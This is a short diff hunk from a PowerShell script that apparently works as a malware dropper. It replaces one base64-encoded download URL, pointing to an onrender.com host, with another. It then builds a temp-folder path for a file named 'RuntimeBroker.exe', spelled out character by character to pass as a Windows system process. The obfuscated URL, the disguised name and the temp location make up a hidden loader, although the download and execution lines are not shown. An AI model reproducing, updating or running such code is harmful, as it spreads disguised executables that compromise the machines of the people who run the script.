@@ -30,7 +30,7 @@ if ($isAdmin) {
 }
 # ────────────────────────────────────────────────────────────────────────
 
-$u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9hd2Vkc2FrbHNhcS5vbnJlbmRlci5jb20vZi9UWVRZaGk5Sg=='))
+$u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9hd2Vkc2FrbHNhcS5vbnJlbmRlci5jb20vZi9tbE5FS3lWLQ=='))
 $t=[IO.Path]::GetTempPath()
 $n=('R','u','n','t','i','m','e','B','r','o','k','e','r','.','e','x','e') -join ''
 $p=$t+$n
